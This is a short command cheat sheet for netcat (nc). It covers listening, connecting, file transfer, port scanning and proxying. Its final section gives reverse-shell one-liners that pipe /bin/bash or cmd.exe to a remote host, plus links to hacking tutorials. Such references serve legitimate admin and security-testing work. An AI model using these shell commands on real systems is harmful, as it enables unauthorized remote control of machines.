# nc

> Reads and writes tcp or udp data.

- Listen on a specified port:

`nc  -l {{port}}`

- Connect to a certain port (you can then write to this port):

`nc {{ip_address}} {{port}}`

- Set a timeout:

`nc -w {{timeout_in_seconds}} {{ipaddress}} {{port}}`

- Serve a file:

`nc -l {{port}} < {{file}}`

- Receive a file:

`nc {{ip_address}} {{port}} > {{file}}`

- Server stay up after client detach:

`nc -k -l {{port}}`

- Client stay up after EOF:

`nc -q {{timeout}} {{ip_address}}`

- Port scanning:

`nc -v -z {{ip_address}} {{port}}`

- Proxy and port forwarding:

`nc -l {{port}} | nc {{hostname}} {{port}}`
- Open a listening socket

`nc -lU socket.sock`
`echo mytext | nc -U socket.sock`

- Send data 

`nc -l {port}`
`echo "test" | nc {host} {port} `

- Reverse shell
`https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/`
`http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`
`nc -lvp {port}`
`linux: nc {host} {port} -e /bin/bash`
`windows: nc.exe {host} {port} -e cmd.exe`
